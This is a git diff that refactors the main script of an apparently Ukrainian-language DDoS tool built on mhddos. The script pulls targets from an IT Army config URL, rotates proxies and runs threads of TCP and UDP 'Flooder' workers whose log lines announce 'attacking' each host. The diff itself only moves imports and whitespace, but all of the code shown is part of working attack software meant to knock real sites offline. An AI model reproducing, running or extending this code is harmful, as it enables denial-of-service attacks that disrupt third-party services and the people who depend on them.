@@ -1,8 +1,6 @@
 # @formatter:off
 import colorama; colorama.init()
 # @formatter:on
-from collections import namedtuple
-from contextlib import suppress
 from itertools import cycle
 from queue import SimpleQueue
 from random import shuffle
@@ -12,20 +10,16 @@ from typing import List
 
 from src.cli import init_argparse
 from src.concurrency import DaemonThreadPool
-from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED, DNS_WORKERS
+from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED, DNS_WORKERS, Params, Stats
 from src.dns_utils import resolve_all_targets
 from src.mhddos import main as mhddos_main
-from src.output import Stats, show_statistic, print_banner, print_progress
+from src.output import show_statistic, print_banner, print_progress
 from src.proxies import update_proxies
 from src.system import fix_ulimits, is_latest_version
 from src.targets import Targets
 
 
-Params = namedtuple('Params', 'target, method')
-
-
 class Flooder(Thread):
-
     def __init__(self, switch_after: int = WORK_STEALING_DISABLED):
         super(Flooder, self).__init__(daemon=True)
         self._switch_after = switch_after
@@ -95,7 +89,7 @@ def run_flooders(num_threads, switch_after) -> List[Flooder]:
         logger.warning(
             f"{cl.RED}Не вдалося запустити усі {num_threads} потоків - "
             f"лише {len(threads)}{cl.RESET}")
-    
+
     return threads
 
 
@@ -112,7 +106,6 @@ def run_ddos(
     table,
 ):
     statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []
-
 
     def register_params(params, container):
         thread_statistics = Stats()
@@ -131,7 +124,6 @@ def run_ddos(
             logger.info(
                 f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}{cl.RESET}"
                 % (params.target.url.host, params.method))
-
 
     for target in targets:
         assert target.is_resolved, "Unresolved target cannot be used for attack"
@@ -152,7 +144,7 @@ def run_ddos(
             raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
 
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
-    
+
     for flooder in tcp_flooders:
         flooder.enqueue(event, kwargs_list)
 
@@ -175,7 +167,7 @@ def run_ddos(
                 break
             show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
             sleep(refresh_rate)
-    
+
     event.clear()
 
 
